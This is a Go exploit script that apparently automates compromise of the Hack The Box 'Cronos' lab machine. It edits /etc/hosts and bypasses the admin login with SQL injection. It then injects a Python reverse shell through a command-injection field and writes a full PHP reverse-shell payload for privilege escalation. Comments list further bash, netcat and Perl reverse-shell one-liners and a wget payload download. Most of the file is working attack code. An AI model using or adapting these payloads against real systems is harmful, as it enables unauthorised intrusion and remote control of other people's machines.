package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/gocolly/colly"
)

func main() {
	//printbanner()
	getvalfromconsole := bufio.NewReader(os.Stdin)
	fmt.Printf("Emter Cronos IP : ")
	ip, _ := getvalfromconsole.ReadString('\n')
	ip = strings.Replace(ip, "\n", "", -1)
	fmt.Printf("Emter Your(VPN) IP : ")
	vpnip, _ := getvalfromconsole.ReadString('\n')
	vpnip = strings.Replace(vpnip, "\n", "", -1)
	createrootshellfile(vpnip)
	edithostfile(ip)
	readhostsafterupdate()
	sqlinjectadminpageandgetfirstshell(vpnip)

}

func edithostfile(ip string) {
	hostfile, err := os.OpenFile("/etc/hosts", os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println(err)
	}
	hostfile.WriteString(ip + "\t" + "cronos.htb admin.cronos.htb\n")
	//hostfile.WriteString(ip + "\t" + "admin.cronos.htb\n")
	hostfile.Close()
}

func readhostsafterupdate() {
	getfile, err := os.Open("/etc/hosts")
	if err != nil {
		log.Fatal(err)
	}

	scanner := bufio.NewScanner(getfile)

	for scanner.Scan() {
		fmt.Println(scanner.Text())

	}
	getfile.Close()
}

func sqlinjectadminpageandgetfirstshell(vpnip string) {
	adminurl := "http://admin.cronos.htb/index.php"
	welcomeurl := "http://admin.cronos.htb/welcome.php"
	c := colly.NewCollector()

	// authenticate
	err := c.Post(adminurl, map[string]string{"username": `' OR 1 #`, "password": "anything"})
	if err != nil {
		log.Fatal(err)
	}

	c.OnResponse(func(r *colly.Response) {
		//log.Println(string(r.Body))
		log.Println(r.StatusCode)
	})
	c.Visit(welcomeurl)
	//escapeshell:= `python -c 'import pty; pty.spawn("/bin/sh")'`
	//bashonliner := `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc URIP 443 >/tmp/f`
	//perloneliner := `perl -e 'use Socket;$i="VPNIP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
	pythonrevshell := `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPNIP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
	pythonrevshell = strings.Replace(pythonrevshell, "VPNIP", vpnip, -1)
	err = c.Post(welcomeurl, map[string]string{"command": "traceroute", "host": `;` + pythonrevshell})
	if err != nil {
		log.Fatal(err)
	}

}

func createrootshellfile(vpnip string) {
	phprevshell := `<?php
	set_time_limit (0);
	$VERSION = "1.0";
	$ip = 'VPNIP';  // CHANGE THIS
	$port = 1234;       // CHANGE THIS
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0;
		
	if (function_exists('pcntl_fork')) {
		// Fork and have the parent process exit
		$pid = pcntl_fork();
		
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
		
		if ($pid) {
			exit(0);  // Parent exits
		}
			
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}
	
		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}
	
	// Change to a safe directory
	chdir("/");
	
	// Remove any umask we inherited
	umask(0);
	
	// Open reverse connection
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}
	
	// Spawn shell process
	$descriptorspec = array(
	   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
	   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
	   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);
	
	$process = proc_open($shell, $descriptorspec, $pipes);
	
	if (!is_resource($process)) {
		printit("ERROR: Can't spawn shell");
		exit(1);
	}
	
	// Set everything to non-blocking
	// Reason: Occsionally reads will block, even though stream_select tells us they won't
	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);
	
	printit("Successfully opened reverse shell to $ip:$port");
	
	while (1) {
		// Check for end of TCP connection
		if (feof($sock)) {
			printit("ERROR: Shell connection terminated");
			break;
		}
	
		// Check for end of STDOUT
		if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
		}
	
		// Wait until a command is end down $sock, or some
		// command output is available on STDOUT or STDERR
		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	
		// If we can read from the TCP socket, send
		// data to process's STDIN
		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}
	
		// If we can read from the process's STDOUT
		// send data down tcp connection
		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}
	
		// If we can read from the process's STDERR
		// send data down tcp connection
		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}
	
	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);
	
	// Like print, but does nothing if we've daemonised ourself
	// (I can't figure out how to redirect STDOUT like a proper daemon)
	function printit ($string) {
		if (!$daemon) {
			print "$string\n";
		}
	}
	
	?> 	
	`

	phprevshell = strings.Replace(phprevshell, "VPNIP", vpnip, -1)
	artisan, _ := os.Create("artisan")
	artisan.WriteString(phprevshell)
	artisan.Close()

	//Escape to a better shell ==> python -c 'import pty; pty.spawn("/bin/sh")'
	//cd /var/www/laravel
	//mv artisan artisanbk
	//python -m SimpleHTTPServer 8080 [this should be in attacker machine]
	//wget -O artisan http://10.10.14.17:8080/artisan
	//nc -lvp 1234 [this should be in attacker machine]
}

func printbanner() {
	fmt.Println(`╔═╗┬─┐┌─┐┌┐┌┌─┐┌─┐
				 ║  ├┬┘│ │││││ │└─┐
				 ╚═╝┴└─└─┘┘└┘└─┘└─┘ `)
}
